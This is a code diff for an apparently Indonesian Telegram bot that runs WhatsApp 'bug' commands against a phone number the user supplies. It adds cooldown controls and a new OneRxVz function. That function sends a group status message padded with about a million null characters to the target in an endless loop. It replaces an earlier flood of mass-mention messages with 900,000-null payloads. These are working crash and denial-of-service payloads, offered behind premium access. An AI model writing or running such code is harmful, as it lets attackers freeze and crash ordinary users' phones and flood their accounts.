@@ -847,7 +847,6 @@ const checkAdmin = (ctx, next) => {
 
   return next();
 };
-/// ---- PREMIUM ---- ///
 const checkAllPremium = (ctx, next) => {
   const id = ctx.from.id.toString();
 
@@ -1033,6 +1032,69 @@ bot.use((ctx, next) => {
 
   return next();
 });
+/// ---- COOLDOWN ---- ///
+function parseCooldown(input) {
+  const match = input.match(/^(\d+)([dhms])$/);
+  if (!match) return null;
+
+  const value = parseInt(match[1]);
+  const unit = match[2];
+
+  switch (unit) {
+    case "d": // detik
+      return value * 1000;
+
+    case "m": // menit
+      return value * 60 * 1000;
+
+    case "h": // jam
+      return value * 60 * 60 * 1000;
+
+    case "s": // hari
+      return value * 24 * 60 * 60 * 1000;
+
+    default:
+      return null;
+  }
+}
+
+
+let COOLDOWN_TIME = 1;
+let COOLDOWN_TEXT = "1d";
+const cooldowns = new Map();
+
+function checkCooldown(ctx, next) {
+  if (!ctx.from?.id) return next();
+
+
+  if (isOwner(ctx.from.id)) return next();
+
+
+  if (COOLDOWN_TIME === 0) return next();
+
+  const userId = String(ctx.from.id);
+  const now = Date.now();
+
+  const expireTime = cooldowns.get(userId) || 0;
+
+  if (now < expireTime) {
+    
+    if (!cooldowns.get(userId + "_msg")) {
+      cooldowns.set(userId + "_msg", true);
+
+      setTimeout(() => cooldowns.delete(userId + "_msg"), 3000);
+
+      return ctx.reply(`⏳ Tunggu ${COOLDOWN_TEXT}!`);
+    }
+    return;
+  }
+
+  
+  cooldowns.set(userId, now + COOLDOWN_TIME);
+
+  return next();
+}
+
 /// -------- ( menu utama ) --------- \\\
 function mainKeyboard() {
   return [
@@ -1131,6 +1193,7 @@ bot.action("xsettings", async (ctx) => {
 ◇ /deladmin
 ◇ /addgrouppremium
 ◇ /delgrouppremium
+◇ /setcd
 ◇ /anticulik
 ◇ /addsafe
 ◇ /delsafe
@@ -1717,6 +1780,26 @@ bot.command("runtime", (ctx) => {
   );
 });
 
+bot.command('setcd', async (ctx) => {
+  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner");
+
+  const args = ctx.message.text.split(' ');
+  if (!args[1]) return ctx.reply("⚠️ Contoh: /setcd 1s / 1m / 1h / 1d / 0");
+
+  if (args[1] === "0") {
+    COOLDOWN_TIME = 0;
+    COOLDOWN_TEXT = "0s";
+    return ctx.reply("✅ Cooldown dimatikan");
+  }
+
+  const time = parseCooldown(args[1]);
+  if (!time) return ctx.reply("⚠️ Format salah!");
+
+  COOLDOWN_TIME = time;
+  COOLDOWN_TEXT = args[1];
+
+  ctx.reply(`✅ Cooldown diubah ke ${COOLDOWN_TEXT}`);
+});
 
 bot.command("anticulik", (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");
@@ -2183,7 +2266,7 @@ bot.command("killsesi", checkOwner, async (ctx) => {
   }
 });
 /// ============= CASE BUG 1 BEBAS SPAM=============\\\
-bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
   
   const q = ctx.message.text.split(" ")[1]; 
   if (!q) return ctx.reply("🪧 ☇ Example : /specterdelay 62xx");
@@ -2201,7 +2284,7 @@ bot.command("specterdelay", checkAllPremium, checkWhatsAppConnection, async (ctx
 
 });
 /// CASE BUG BEBAS SPAM 2/// 
-bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  
   const q = ctx.message.text.split(" ")[1]; 
   if (!q) return ctx.reply("🪧 ☇ Example : /delayworek 62xx");
@@ -2218,7 +2301,7 @@ bot.command("delayworek", checkAllPremium, checkWhatsAppConnection, async (ctx) 
 
 });
 /// ============= CASE BUG 3 BEBAS SPAM=============\\\
-bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
   
   const q = ctx.message.text.split(" ")[1]; 
   if (!q) return ctx.reply("🪧 ☇ Example : /EquarTerdelay 62xx");
@@ -2236,7 +2319,7 @@ bot.command("EquarTerdelay", checkAllPremium, checkWhatsAppConnection, async (ct
 
 });
 /// ============= CASE BUG 4 BEBAS SPAM=============\\\
-bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
   
   const q = ctx.message.text.split(" ")[1]; 
   if (!q) return ctx.reply("🪧 ☇ Example : /dangerdelay 62xx");
@@ -2260,7 +2343,7 @@ bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx)
 
 });
 /// CASE BUG BEBAS SPAM 5 \\\
-bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 Example: /qiSys 62xxxx`);
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
@@ -2294,7 +2377,7 @@ bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   })();
 });
 /// CASE BUG BEBAS SPAM 5 \\\
-bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 Example: /lowsdelay 62xxxx`);
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
@@ -2323,7 +2406,7 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
   })();
 }); 
 /// CASE BUG 6 \\\
-bot.command("xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("xange", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
 
   const q = ctx.message.text.split(" ")[1]; 
   if (!q) return ctx.reply("🪧 ☇ Example : /xange 62xx");
@@ -2342,13 +2425,13 @@ bot.command("xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     },
   });
 
-  for (let r = 0; r < 75; r++) {
-    await FriendDileyy(sock, target);
-    await sleep(500)
+  for (let r = 0; r < 5; r++) {
+    await OneRxVz(sock, target);
+    await sleep(800)
     }
 })
 /// --------- ( CASE BUG 7 ) ---------- \\\
-bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 Example: /ultramencrash 62xxxx`);
   const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
@@ -2825,37 +2908,39 @@ async function SuperDelay(sock, target) {
  await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
 }
 
-async function FriendDileyy(sock, target, mention = true) {
-  for (let r = 0; r < 75; r++) {
-   const ViSI = generateWAMessageFromContent(target, {
-      interactiveResponseMessage: {
-        contextInfo: {
-          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
-        },
-        body: {
-          text: "TELEGRAM VISI ML",
-          format: "DEFAULT"
-        },
-        nativeFlowResponseMessage: {
-          name: "galaxy_message",
-          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
-          version: 3
+async function OneRxVz(sock, target) {
+    const RxZv = {
+        viewOnceMessage: {
+            message: {
+                groupStatusMessageV2: {
+                    message: {
+                        interactiveResponseMessage: {
+                            nativeFlowResponseMessage: {
+                                name: "galaxy_message",
+                                paramsJson: "\x10" + "\u0000".repeat(1030000),
+                                version: 3
+                            }
+                        }
+                    }
+                }
+            }
         }
-      }
-    }, {});
-    
-    await sock.relayMessage(
-      target,
-      {
-        groupStatusMessageV2: {
-          message: Gua.message
+    };
+
+    const Oneshoot = await generateWAMessageFromContent(target, RxZv, {
+        userJid: sock.user.id
+    });
+
+    while (true) {
+        try {
+            await sock.relayMessage(target, Oneshoot.message, {
+                participant: { jid: target }
+            });
+            await new Promise(resolve => setTimeout(resolve, 500));
+        } catch (error) {
+            await new Promise(resolve => setTimeout(resolve, 1000));
         }
-      },
-      mention
-        ? { messageId: Gua.key.id, participant: { jid: target } }
-        : { messageId: Gua.key.id }
-    );
-  }
+    }
 }
 
 async function fvckmklu(sock, target) {
